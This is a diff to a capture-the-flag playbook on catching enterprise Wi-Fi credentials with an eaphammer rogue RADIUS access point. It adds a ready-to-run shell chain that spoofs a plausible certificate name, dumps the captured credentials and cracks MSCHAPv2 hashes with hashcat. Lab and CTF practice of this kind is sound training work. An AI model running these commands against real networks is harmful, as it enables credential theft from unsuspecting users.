@@ -1,5 +1,7 @@
 # Cert-phish EAP flags — weak validation reveals the flag
 
+**Verified against:** eaphammer 1.14 / hostapd-wpe (hostapd 2.10) as of 2026-Q3
+
 An enterprise client with weak certificate validation associates to
 your rogue RADIUS. The inner-EAP exchange reveals a credential, an
 MDM token, or a plaintext GTC prompt whose value is the flag.
@@ -26,7 +28,9 @@ run_sequence([
      "essid": "<target ESSID>",
      "auth": "wpa-eap",
      "channel": 6,
-     "negotiate_downgrade": "peap-mschapv2",
+     "negotiate": "manual",
+     "phase_1_methods": "PEAP",
+     "phase_2_methods": "MSCHAPV2",
      "hostile_portal": False,
      "cert_cn": "<pick a plausible CN — e.g. attwifi.att.net>"},
 
@@ -37,6 +41,34 @@ run_sequence([
     {"action": "eaphammer_dump_creds"},
 ])
 ```
+
+## MCP mapping / fallback
+
+`eaphammer_rogue` and `eaphammer_dump_creds` are **not in `src/`** —
+the current MCP `do_create_rogue_ap` only supports open/WPA-PSK, not
+WPA-EAP. Drive `eaphammer` on the attack host directly.
+
+**Fallback shell chain:**
+
+```bash
+# 1. one-shot rogue-RADIUS + rogue AP
+sudo eaphammer --interface wlan0 \
+    --essid "<target ESSID>" \
+    --auth wpa-eap \
+    --creds \
+    --channel 6 \
+    --negotiate manual \
+    --phase-1-methods PEAP \
+    --phase-2-methods MSCHAPV2 \
+    --cn "attwifi.att.net"
+
+# 2. read logged creds
+cat /root/eaphammer/loot/hostapd-*.creds
+# or feed straight into hashcat
+hashcat -m 5500 <alice-hash-line> /opt/wordlists/rockyou.txt
+```
+
+For hostapd-wpe as an alternative, see `rogue-radius-eap-flag.md` Path A.
 
 ## The flag surface
 
@@ -55,7 +87,7 @@ run_sequence([
   Windows validate strictly. Attack does not fire. Need a matching
   cert (extracted from a phishing kit or a domain the client trusts).
 - **PEAP peer refuses downgrade.** Some clients pin the inner method
-  in the profile. `--negotiate downgrade` in eaphammer offers PEAP
+  in the profile. `--negotiate weakest` in eaphammer offers PEAP
   → GTC / MSCHAPv2 / MD5; the client may reject.
 - **No 802.1X clients probing.** WCTF puzzles usually seed the
   puzzle with a target STA; if you see none, the puzzle is not
